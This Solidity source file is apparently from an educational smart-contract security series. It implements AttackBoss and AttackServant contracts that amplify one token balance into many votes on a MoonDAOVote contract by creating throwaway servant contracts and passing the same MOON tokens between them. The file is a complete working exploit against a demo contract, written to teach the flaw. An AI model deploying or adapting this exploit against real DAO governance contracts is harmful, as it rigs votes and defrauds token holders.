// SPDX-License-Identifier: BSL-1.0 (Boost Software License 1.0)

//-------------------------------------------------------------------------------------//
// Copyright (c) 2022 - 2023 serial-coder: Phuwanai Thummavet (mr.thummavet@gmail.com) //
//-------------------------------------------------------------------------------------//

// For more info, please refer to my article:
//  - On Medium: https://medium.com/valixconsulting/solidity-security-by-example-12-amplification-attack-double-spending-1-990b2da52e6c
//  - On serial-coder.com: https://www.serial-coder.com/post/solidity-smart-contract-security-by-example-12-amplification-attack-double-spending-01/

pragma solidity 0.8.20;

import "./Dependencies.sol";

interface IMoonDAOVote {
    function vote(uint256 _candidateID) external;
}

contract AttackServant {
    IMoonToken public immutable moonToken;
    IMoonDAOVote public immutable moonDAOVote;

    constructor(IMoonToken _moonToken, IMoonDAOVote _moonDAOVote) {
        moonToken = _moonToken;
        moonDAOVote = _moonDAOVote;
    }

    function attack(uint256 _candidateID) external {
        uint256 moonInitAmount = moonToken.getUserBalance(address(this));
        require(moonInitAmount >= 1, "Require at least 1 MOON to attack");

        // Perform the vote and then transfer the MOON tokens back to the boss contract
        moonDAOVote.vote(_candidateID);
        moonToken.transfer(msg.sender, moonInitAmount);
    }
}

contract AttackBoss {
    IMoonToken public immutable moonToken;
    IMoonDAOVote public immutable moonDAOVote;

    constructor(IMoonToken _moonToken, IMoonDAOVote _moonDAOVote) {
        moonToken = _moonToken;
        moonDAOVote = _moonDAOVote;
    }

    // Perform the voting amplification attack
    function attack(uint256 _candidateID, uint256 _xTimes) external {
        uint256 moonInitAmount = moonToken.getUserBalance(msg.sender);
        require(moonInitAmount >= 1, "Require at least 1 MOON to attack");

        // Transfer MOON tokens from the attacker to this contract
        moonToken.transferFrom(msg.sender, address(this), moonInitAmount);

        for (uint256 i = 0; i < _xTimes; i++) {
            // Create a servant contract, a Sybil account
            AttackServant servant = new AttackServant(moonToken, moonDAOVote);

            // Transfer MOON tokens to the servant contract
            moonToken.transfer(address(servant), moonInitAmount);

            // Invoke the servant contract to do the vote
            servant.attack(_candidateID);
        }

        // Transfer MOON tokens back to the attacker
        moonToken.transfer(msg.sender, moonInitAmount);
    }
}